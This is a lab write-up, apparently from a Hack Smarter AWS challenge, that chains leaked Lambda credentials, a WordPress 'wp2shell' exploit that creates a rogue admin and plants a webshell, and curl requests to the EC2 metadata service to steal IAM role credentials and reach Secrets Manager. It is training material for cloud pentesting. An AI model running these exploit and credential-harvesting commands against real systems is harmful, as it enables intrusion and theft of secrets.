# Challenge Lab Name: `Second`
<details open>
<summary><b>Scenario & Overview</b></summary>

> **Platform:** <a href="https://www.hacksmarter.org/" target="_blank" title="Open Hack Smarter Platform"><img src="https://img.shields.io/badge/Hack_Smarter_↗-181717?style=flat&logo=hacksmarter&logoColor=white" style="vertical-align: middle; height: 20px;" alt="Hack Smarter Platform Link"></a> &nbsp;
>
> Objective
> You have been hired to perform an AWS pentest against a client's infrastructure. They have planted a "flag" in AWS Secrets Manager. If you are able to retrieve this flag, it demonstrates full compromise of the client's AWS account.
>
> Initial Access
> The client has provided you with an Access Key and Secret for a low-privileged user.
>
> Attack path was slightly updated. I don't want to spoil things... just make sure you check what resources you have access to each time you compromise a new IAM user.

</details>

## Detailed Methodology

<details open>
<summary><b>Initial Access</b></summary>

The initial access credentials that I got were for the IAM user `cg-pentest-lab` which I configured in a AWS profile by running `aws configure --profile second`. When configuring the AWS profile I used the default region name of **us-east-1** and the default output format of **json**. 


```bash
└─$ aws sts get-caller-identity --profile second       
{
    "UserId": "AIDAWXC5S6KGNSCINXEFC",
    "Account": "461905261196",
    "Arn": "arn:aws:iam::461905261196:user/cg-pentest-lab"
}
```

### Enumerating Permissions Using Pacu

I first started enumerating permissions using the IAM service but when trying to list the attached policies for the IAM user `cg-pentest-lab` I got an **AccessDenied** error. To find out what permissions this user had I started the Pacu AWS exploitation framework. The **iam__bruteforce_permissions** module let me know that the IAM user could list Lambda functions.

```bash
Pacu (second:imported-second) > run iam__bruteforce_permissions --region us-east-1
  Running module iam__bruteforce_permissions...
...
Pacu (second:imported-second) > data iam
{
  "permissions": {
    "allow": [
      "sts:GetCallerIdentity",
      "sts:GetSessionToken",
      "dynamodb:DescribeEndpoints",
      "lambda:ListFunctions"
    ],
    "deny": []
  }
}
```

Since I did not have IAM permissions, the **iam__enum_users_roles_policies_groups** did not provide anything of use. 

```bash
Pacu (second:imported-second) > run iam__enum_users_roles_policies_groups 
  Running module iam__enum_users_roles_policies_groups...
[iam__enum_users_roles_policies_groups] No Users Found
[iam__enum_users_roles_policies_groups]   FAILURE: MISSING NEEDED PERMISSIONS
[iam__enum_users_roles_policies_groups] No Roles Found
[iam__enum_users_roles_policies_groups]   FAILURE: MISSING NEEDED PERMISSIONS
[iam__enum_users_roles_policies_groups] No Policies Found
[iam__enum_users_roles_policies_groups]   FAILURE: MISSING NEEDED PERMISSIONS
[iam__enum_users_roles_policies_groups] No Groups Found
[iam__enum_users_roles_policies_groups]   FAILURE: MISSING NEEDED PERMISSIONS
[iam__enum_users_roles_policies_groups] iam__enum_users_roles_policies_groups completed.

[iam__enum_users_roles_policies_groups] MODULE SUMMARY:

  0 Users Enumerated
  0 Roles Enumerated
  0 Policies Enumerated
  0 Groups Enumerated
  IAM resources saved in Pacu database.
```
### Listing Lambda Functions

When listing the Lambda functions with the command shown below I found that there was one named `cg-log-processor-lab`. Within the listing, I also found environment variables configured labeled **LAMBDA_MANAGER_AK** and **LAMBDA_MANAGER_SK** which contained a set of AWS credentials. 

```bash
Pacu (second:imported-second) > aws lambda list-functions --profile second --region us-east-1
{
    "Functions": [
        {
            "FunctionName": "cg-log-processor-lab",
            "FunctionArn": "arn:aws:lambda:us-east-1:461905261196:function:cg-log-processor-lab",
            "Runtime": "python3.9",
            "Role": "arn:aws:iam::461905261196:role/cg-lambda-role-lab",
            "Handler": "lambda.handler",
            "CodeSize": 249,
            "Description": "",
            "Timeout": 3,
            "MemorySize": 128,
            "LastModified": "2026-10-23T00:05:15.296+0000",
            "CodeSha256": "gpAzQITfdhKnlKeb7wY78NGp0K/rTWw9u06xtnB3ZtI=",
            "Version": "$LATEST",
            "Environment": {
                "Variables": {
                    "LAMBDA_MANAGER_AK": "****************",
                    "LAMBDA_MANAGER_SK": "**********************"
                }
            },
            "TracingConfig": {
                "Mode": "PassThrough"
            },
            "RevisionId": "81e0748e-cb89-4265-953b-6374a8dfa127",
            "PackageType": "Zip",
            "Architectures": [
                "x86_64"
            ],
            "EphemeralStorage": {
                "Size": 512
            },
            "SnapStart": {
                "ApplyOn": "None",
                "OptimizationStatus": "Off"
            },
            "LoggingConfig": {
                "LogFormat": "Text",
                "LogGroup": "/aws/lambda/cg-log-processor-lab"
            }
        }
    ]
}
```

</details>


<details open>
<summary><b>Privilege Escalation & EC2 Exploitation</b></summary>

With the new set of AWS credentials found from the Lambda function's environment variables I configured a new AWS profile named **cg-lambda-manager-lab** with the same default region and output format used for the initital access credentials. Running the command below let me know that the AWS credentials belonged to the IAM user `cg-lambda-manager-lab`. 

```bash
└─$ aws sts get-caller-identity --profile cg-lambda-manager-lab
{
    "UserId": "AIDAWXC5S6KGBLOVULK2O",
    "Account": "461905261196",
    "Arn": "arn:aws:iam::461905261196:user/cg-lambda-manager-lab"
}
```

Using the same methodology as last time I first tried using the IAM service to check policy documents attached to the new IAM user `cg-lambda-manager-lab`, but got an **AccessDenied** error. This led me to using Pacu again where I found that the IAM user had permission to describe EC2 instances. 

```bash
Pacu (second:imported-cg-lambda-manager-lab) > run iam__bruteforce_permissions --region us-east-1
  Running module iam__bruteforce_permissions...
...
Pacu (second:imported-cg-lambda-manager-lab) > data iam
{
  "Groups": [],
  "Policies": [],
  "Roles": [],
  "Users": [],
  "permissions": {
    "allow": [
      "sts:GetSessionToken",
      "sts:GetCallerIdentity",
      "dynamodb:DescribeEndpoints",
      "ec2:DescribeInstances"
    ],
    "deny": []
  }
}
```

### EC2 Enumeration

Having permission to describe EC2 instances led to me finding one running on the public IP address `3.236.189.115`. 

```bash
Pacu (second:imported-cg-lambda-manager-lab) > aws ec2 describe-instances --query "Reservations[].Instances[].[InstanceId,PublicIpAddress,State.Name,KeyName,IamInstanceProfile.Arn]" --region us-east-1 --profile cg-lambda-manager-lab
[
    [
        "i-0e328505131c4bd13",
        "3.236.189.115",
        "running",
        "cg-ec2-key-pair-lab",
        "arn:aws:iam::461905261196:instance-profile/cg-ec2-instance-profile-lab"
    ]
]
```

<details>
<summary><b>Describing EC2 Instances Command Long Format Output</b></summary>

```bash
Pacu (second:imported-cg-lambda-manager-lab) > aws ec2 describe-instances --region us-east-1 --profile cg-lambda-manager-lab
{
    "Reservations": [
        {
            "ReservationId": "r-092ff421b19449632",
            "OwnerId": "461905261196",
            "Groups": [],
            "Instances": [
                {
                    "Architecture": "x86_64",
                    "BlockDeviceMappings": [
                        {
                            "DeviceName": "/dev/sda1",
                            "Ebs": {
                                "AttachTime": "2026-10-23T00:05:16.000Z",
                                "DeleteOnTermination": true,
                                "Status": "attached",
                                "VolumeId": "vol-0e9ff356c9648a5c5",
                                "EbsCardIndex": 0
                            }
                        }
                    ],
                    "ClientToken": "terraform-eeCbL3SMFZZtKKoiqXck2WqDnM",
                    "EbsOptimized": false,
                    "EnaSupport": true,
                    "Hypervisor": "xen",
                    "IamInstanceProfile": {
                        "Arn": "arn:aws:iam::461905261196:instance-profile/cg-ec2-instance-profile-lab",
                        "Id": "AIPAWXC5S6KGHEDWREF6O"
                    },
                    "NetworkInterfaces": [
                        {
                            "Association": {
                                "IpOwnerId": "amazon",
                                "PublicDnsName": "ec2-3-236-189-115.compute-1.amazonaws.com",
                                "PublicIp": "3.236.189.115"
                            },
                            "Attachment": {
                                "AttachTime": "2026-10-23T00:05:15.000Z",
                                "AttachmentId": "eni-attach-0d767792671ceb8b3",
                                "DeleteOnTermination": true,
                                "DeviceIndex": 0,
                                "Status": "attached",
                                "NetworkCardIndex": 0
                            },
                            "Description": "",
                            "Groups": [
                                {
                                    "GroupId": "sg-07c29c897335b0dfc",
                                    "GroupName": "cg-ec2-sg-lab"
                                }
                            ],
                            "Ipv6Addresses": [],
                            "MacAddress": "02:ff:e1:4d:16:5b",
                            "NetworkInterfaceId": "eni-0edebdff86b2b0b0c",
                            "OwnerId": "461905261196",
                            "PrivateDnsName": "ip-10-10-10-90.ec2.internal",
                            "PrivateIpAddress": "10.10.10.90",
                            "PrivateIpAddresses": [
                                {
                                    "Association": {
                                        "IpOwnerId": "amazon",
                                        "PublicDnsName": "ec2-3-236-189-115.compute-1.amazonaws.com",
                                        "PublicIp": "3.236.189.115"
                                    },
                                    "Primary": true,
                                    "PrivateDnsName": "ip-10-10-10-90.ec2.internal",
                                    "PrivateIpAddress": "10.10.10.90"
                                }
                            ],
                            "SourceDestCheck": true,
                            "Status": "in-use",
                            "SubnetId": "subnet-054ebfa67b1649eb7",
                            "VpcId": "vpc-085fe6b301b43813b",
                            "InterfaceType": "interface",
                            "Operator": {
                                "Managed": false
                            }
                        }
                    ],
                    "RootDeviceName": "/dev/sda1",
                    "RootDeviceType": "ebs",
                    "SecurityGroups": [
                        {
                            "GroupId": "sg-07c29c897335b0dfc",
                            "GroupName": "cg-ec2-sg-lab"
                        }
                    ],
                    "SourceDestCheck": true,
                    "Tags": [
                        {
                            "Key": "Name",
                            "Value": "cg-marketing-wp-lab"
                        }
                    ],
                    "VirtualizationType": "hvm",
                    "CpuOptions": {
                        "CoreCount": 1,
                        "ThreadsPerCore": 2
                    },
                    "CapacityReservationSpecification": {
                        "CapacityReservationPreference": "open"
                    },
                    "HibernationOptions": {
                        "Configured": false
                    },
                    "MetadataOptions": {
                        "State": "applied",
                        "HttpTokens": "optional",
                        "HttpPutResponseHopLimit": 2,
                        "HttpEndpoint": "enabled",
                        "HttpProtocolIpv6": "disabled",
                        "InstanceMetadataTags": "disabled"
                    },
                    "EnclaveOptions": {
                        "Enabled": false
                    },
                    "BootMode": "uefi-preferred",
                    "PlatformDetails": "Linux/UNIX",
                    "UsageOperation": "RunInstances",
                    "UsageOperationUpdateTime": "2026-10-23T00:05:15.000Z",
                    "PrivateDnsNameOptions": {
                        "HostnameType": "ip-name",
                        "EnableResourceNameDnsARecord": false,
                        "EnableResourceNameDnsAAAARecord": false
                    },
                    "MaintenanceOptions": {
                        "AutoRecovery": "default",
                        "RebootMigration": "default"
                    },
                    "CurrentInstanceBootMode": "uefi",
                    "NetworkPerformanceOptions": {
                        "BandwidthWeighting": "default"
                    },
                    "Operator": {
                        "Managed": false,
                        "HiddenByDefault": false
                    },
                    "SecondaryInterfaces": [],
                    "InstanceId": "i-0e328505131c4bd13",
                    "ImageId": "ami-033ea4ff4a9c726dc",
                    "State": {
                        "Code": 16,
                        "Name": "running"
                    },
                    "PrivateDnsName": "ip-10-10-10-90.ec2.internal",
                    "PublicDnsName": "ec2-3-236-189-115.compute-1.amazonaws.com",
                    "StateTransitionReason": "",
                    "KeyName": "cg-ec2-key-pair-lab",
                    "AmiLaunchIndex": 0,
                    "ProductCodes": [],
                    "InstanceType": "t3.medium",
                    "LaunchTime": "2026-10-23T00:05:15.000Z",
                    "Placement": {
                        "AvailabilityZoneId": "use1-az1",
                        "GroupName": "",
                        "Tenancy": "default",
                        "AvailabilityZone": "us-east-1a"
                    },
                    "Monitoring": {
                        "State": "disabled"
                    },
                    "SubnetId": "subnet-054ebfa67b1649eb7",
                    "VpcId": "vpc-085fe6b301b43813b",
                    "PrivateIpAddress": "10.10.10.90",
                    "PublicIpAddress": "3.236.189.115"
                }
            ]
        }
    ]
}
```

</details>

### Nmap Scanning

With the EC2's public IP address, I went ahead and ran an Nmap scan which found that there was a website being hosted on port 80. A specific finding from Nmap's scan was that the website was using WordPress version **6.9**. 

```bash
└─$ nmap -sC -sV -Pn 3.236.189.115                    
Starting Nmap 7.991 ( https://nmap.org ) at 2026-10-22 17:29 -0700
Nmap scan report for ec2-3-236-189-115.compute-1.amazonaws.com (3.236.189.115)
Host is up (0.073s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.18 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 85:98:d7:47:9b:3f:60:ad:64:6a:27:5c:95:a8:f4:e8 (ECDSA)
|_  256 e1:8b:aa:e5:58:dd:b8:01:15:c9:d4:e4:3e:ab:f8:ec (ED25519)
53/tcp open  domain  (generic dns response: REFUSED)
| dns-nsid: 
|_  id.server: lax11
| fingerprint-strings: 
|   DNSVersionBindReqTCP: 
|     version
|_    bind
80/tcp open  http    Apache httpd 2.4.66 ((Debian))
|_http-generator: WordPress 6.9
|_http-title: CG Marketing Portal
| http-robots.txt: 1 disallowed entry 
|_/wp-admin/
|_http-server-header: Apache/2.4.66 (Debian)
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port53-TCP:V=7.991%I=7%D=10/22%Time=6ADAAA77%P=x86_64-pc-linux-gnu%r(DN
SF:SVersionBindReqTCP,1D6,"\x01\xd4\0\x06\x81\x85\0\x01\0\0\0\0\0\x01\x07v
SF:ersion\x04bind\0\0\x10\0\x03\0\0\)\x04\xd0\0\0\0\0\x01\xab\0\x0c\x01\xa
SF:7\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0
SF:\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\
SF:0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0
SF:\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\
SF:0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0
SF:\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\
SF:0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0
SF:\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\
SF:0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0
SF:\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\
SF:0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0
SF:\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 31.52 seconds
```

#### Running `wp2shell.py`

Viewing the [GitHub repository](https://github.com/0xsha/wp2shell) for **CVE-2026-63030 + CVE-2026-60137 - “wp2shell”: unauthenticated RCE in WordPress core** I found that I could abuse the WordPress website with the Python script provided. 

Before running the exploit I ran the command below to check that the WordPress website was vulnerable to the **wp2shell** exploit. In the command's output I could see that the website was indeed vulnerable to attack. 

```bash
└─$ python3 wp2shell.py check http://3.236.189.115/
wp2shell - RCE PoC by 0xsha
[*] WordPress version: 6.9.0  VULNERABLE - full RCE chain
[+] Batch endpoint reachable and unauthenticated (HTTP 207) at http://3.236.189.115/wp-json/batch/v1
[+] Route confusion ACTIVE - categories request answered by the block-renderer handler (block_cannot_read); CVE-2026-63030 confirmed.
[+] SQL injection CONFIRMED - boolean-blind differential over author__not_in (CVE-2026-60137).
[+] Time-based channel also confirmed - baseline 0.20s vs injected 3.21s.
```

Knowing that the WordPress website was vulnerable I went ahead and ran the command below, creating a webshell inside the EC2 instance running. In the webshell I could confirm that I was now the `www-data` user in the EC2 instance. 

```bash
└─$ python3 wp2shell.py shell http://3.236.189.115/ -i
wp2shell - RCE PoC by 0xsha
[*] No credentials supplied - creating a fresh administrator pre-auth (no hash, no crack) ...
[+] Administrator created: wp2_f00968bd597e / Wp2!kGrrOzYCap_3BlJoE49T  (borrowed admin id 1)
[!] This uploads a plugin containing a webshell to the target.
[*] Authenticating as 'wp2_f00968bd597e' ...
[+] Authenticated.
[*] Deploying webshell plugin ...
[+] Webshell: http://3.236.189.115/wp-content/plugins/wp2shell_75058a87/wp2shell_75058a87.php
[*] Interactive shell - 'exit' or Ctrl-D to quit.
/var/www/html/wp-content/plugins/wp2shell_5deace9f $ whoami
www-data
```

### EC2 Metadata User Data

Since I now had a webshell in the running EC2 instance I could access the EC2 instance user data and metadata, which is mentioned in this AWS documentation [page](https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/instancedata-data-retrieval.html). Viewing the user data by running `curl http://169.254.169.254/latest/user-data` in the webshell I found admin credentials for the WordPress website. I also found environment variables, **WP_MANAGER_ACCESS_KEY_ID** and **WP_MANAGER_SECRET_ACCESS_KEY**, which contained AWS credentials. 


```bash
/var/www/html/wp-content/plugins/wp2shell_75058a87 $ curl http://169.254.169.254/latest/user-data
#!/bin/bash
# Update and install Docker
apt-get update -y
DEBIAN_FRONTEND=noninteractive apt-get install -y docker.io curl
systemctl start docker
systemctl enable docker

# Run MariaDB
docker run -d --name wordpress-db --restart always \
  -e MYSQL_ROOT_PASSWORD=cloudgoat_root_pass \
  -e MYSQL_DATABASE=wordpress \
  -e MYSQL_USER=wordpress \
  -e MYSQL_PASSWORD=cloudgoat_wp_pass \
  mariadb:10.5

# Run WordPress 6.9.0
docker run -d --name wordpress --restart always \
  --link wordpress-db:mysql \
  -e WORDPRESS_DB_USER=wordpress \
  -e WORDPRESS_DB_PASSWORD=cloudgoat_wp_pass \
  -e WORDPRESS_DB_NAME=wordpress \
  -p 80:80 \
  wordpress:6.9.0

# Wait for DB and WordPress to start up
sleep 30

# Install wp-cli
docker exec wordpress curl -sO https://raw.githubusercontent.com/wp-cli/builds/gh-pages/phar/wp-cli.phar
docker exec wordpress chmod +x wp-cli.phar
docker exec wordpress mv wp-cli.phar /usr/local/bin/wp

# Fetch Public IP
for i in {1..10}; do
  PUBLIC_IP=$(curl -s http://169.254.169.254/latest/meta-data/public-ipv4)
  if [ ! -z "$PUBLIC_IP" ]; then
    break
  fi
  sleep 2
done
if [ -z "$PUBLIC_IP" ]; then
  PUBLIC_IP="127.0.0.1"
fi

# Run Core Install
docker exec --user www-data wordpress wp core install \
  --url="http://$PUBLIC_IP" \
  --title="CG Marketing Portal" \
  --admin_user=cgadmin \
  --admin_password=super-strong-wp-password \
  --admin_email=admin@cg.local

# Disable automatic updates to keep WordPress in the vulnerable state for the lab
docker exec --user www-data wordpress wp config set WP_AUTO_UPDATE_CORE false --raw
docker exec --user www-data wordpress wp config set AUTOMATIC_UPDATER_DISABLED true --raw

# Ensure upload directory exists and is writable
docker exec wordpress mkdir -p /var/www/html/wp-content/uploads
docker exec wordpress chown -R www-data:www-data /var/www/html/wp-content/uploads

# Create a sample post
docker exec --user www-data wordpress wp post create \
  --post_title="Welcome to our Marketing Site!" \
  --post_content="This is our official corporate marketing site. All uploads and updates are managed by the engineering team." \
  --post_status=publish

# Automated backup configuration - wp-manager credentials
# Note: DO NOT expose these credentials in plaintext in Git!
export WP_MANAGER_ACCESS_KEY_ID="************"
export WP_MANAGER_SECRET_ACCESS_KEY="**************"
```

Using the AWS credentials found from the EC2 user data I went ahead and created a new profile named **wp-manager**. By running the command below I could see that the credentials were for the IAM user `cg-wp-manager-lab`. 

```bash
└─$ aws sts get-caller-identity --profile wp-manager           
{
    "UserId": "AIDAWXC5S6KGLDUFVIXFY",
    "Account": "461905261196",
    "Arn": "arn:aws:iam::461905261196:user/cg-wp-manager-lab"
}
```

Checking the permissions for this new IAM user, I came to find out from running Pacu I had permission to descibe EC2 instances and descibe EC2 tags. 

```bash
Pacu (second:imported-wp-manager) > run iam__bruteforce_permissions --region us-east-1
  Running module iam__bruteforce_permissions...
...
Pacu (second:imported-wp-manager) > data iam
{
  "Groups": [],
  "Policies": [],
  "Roles": [],
  "Users": [],
  "permissions": {
    "allow": [
      "dynamodb:DescribeEndpoints",
      "sts:GetCallerIdentity",
      "sts:GetSessionToken",
      "ec2:DescribeTags",
      "ec2:DescribeInstances"
    ],
    "deny": []
  }
}
```

Based off of the output above I could see that there would be no more additional information found, and even checked by running the EC2 describe-instances  command which outputted the same EC2 instance found earlier. 

```bash
Pacu (second:imported-wp-manager) > aws ec2 describe-instances --query "Reservations[].Instances[].[InstanceId,PublicIpAddress,State.Name,KeyName,IamInstanceProfile.Arn]" --region us-east-1 --profile wp-manager
[
    [
        "i-0e328505131c4bd13",
        "3.236.189.115",
        "running",
        "cg-ec2-key-pair-lab",
        "arn:aws:iam::461905261196:instance-profile/cg-ec2-instance-profile-lab"
    ]
]
```

### EC2 Instance Metadata 

Going back to the webshell created from the `wp2shell.py` exploit, I went ahead and ran `curl` to find if there were any IAM roles associated with the instance. Through multiple `curl` commands, I could see that the IAM role `cg-ec2-role-lab` was attached to the EC2 instance and was able to get temporary credentials to assume the IAM role. 

```bash
/home $ curl http://169.254.169.254/latest/meta-data/iam/security-credentials/cg-ec2-role-lab
{
  "Code" : "Success",
  "LastUpdated" : "2026-10-23T00:49:37Z",
  "Type" : "AWS-HMAC",
  "AccessKeyId" : "************",
  "SecretAccessKey" : "********************",
  "Token" : "IQoJb**************************ziEp4SQ==",
  "Expiration" : "2026-10-23T06:52:40Z"
}
```

</details>


<details open>
<summary><b>Assuming IAM Role & Extracting Secrets</b></summary>

With the new AWS credentials found for the IAM role I went ahead and created yet another AWS profile which I confirmed by running the command below.  

```bash
└─$ aws sts get-caller-identity --profile cg-ec2-role-lab
{
    "UserId": "AROAWXC5S6KGAGC2426DJ:i-0e328505131c4bd13",
    "Account": "461905261196",
    "Arn": "arn:aws:sts::461905261196:assumed-role/cg-ec2-role-lab/i-0e328505131c4bd13"
}
```

With the assumed role of `cg-ec2-role-lab` I went ahead and enumerated for permisisons running Pacu. This is where I found that the IAM role had permission to list secrets from the AWS Secrets Manager. 

```bash
Pacu (second:imported-cg-ec2-role-lab) > run iam__bruteforce_permissions --region us-east-1
  Running module iam__bruteforce_permissions...
...
Pacu (second:imported-cg-ec2-role-lab) > data iam
{
  "Groups": [],
  "Policies": [],
  "Roles": [],
  "Users": [],
  "permissions": {
    "allow": [
      "secretsmanager:ListSecrets",
      "sts:GetCallerIdentity",
      "dynamodb:DescribeEndpoints"
    ],
    "deny": []
  }
}
```

To list the secrets I used the Pacu module **secrets_enum** which is shown below. Pacu found a secret named `cg-final-flag-lab` and stored it in the directory `~/.local/share/pacu/<session name>/downloads/secrets/`. In my case, I had named the Pacu session running as **second** and when I checked the contents of the `secrets.txt` file located in that directory I got the challenge flag. 

```bash
Pacu (second:imported-cg-ec2-role-lab) > run secrets__enum --regions us-east-1 --secrets-manager --parameter-store
  Running module secrets__enum...
[secrets__enum] Starting region us-east-1...
[secrets__enum]  Found secret: cg-final-flag-lab
[secrets__enum] Probing Secret: cg-final-flag-lab
[secrets__enum] Probing parameter store
[secrets__enum]  FAILURE: 
[secrets__enum]   AccessDeniedException
[secrets__enum]      Could not list parameters... Exiting
[secrets__enum] secrets__enum completed.

[secrets__enum] MODULE SUMMARY:

    1 Secret(s) were found in AWS secretsmanager
'    0 Parameter(s) were found in AWS Systems Manager Parameter Store    
    Check ~/.local/share/pacu/<session name>/downloads/secrets/ to get the values
```

</details>

<details open>
<summary><b>Impact & Post-Exploitation Potential</b></summary>

Since the initial access credentials had permission to view Lambda functions I was able to view one which contained AWS credentials in its environment variables. From there I gained newer privileges which allowed me to describe EC2 instances. Using the information listed for EC2 instances and running an Nmap scan I noted that the EC2 instance was vulnerable to a WordPress website exploit. From there I created a webshell using the exploit Python script and was able to view the EC2's user data containing admin credentials for multiple services and AWS credentials, and view the EC2's metadata containing which led to temporary credentials for an IAM role. After enumerating the IAM role found I was able to view secrets in the AWS Secrets Manager. 

Depending on if any usernames or passwords were reused for different accounts not on AWS the potential impact could lead to uncovering more admin privileges for different platforms. In this specific instance, getting the admin credentials for the WordPress website could lead to public website defacement which could give the company a bad reputation for being vulnerable to attackers. Another perspective would also be losing customers due to lack of trust which would mean financial losses for the company.  

</details>
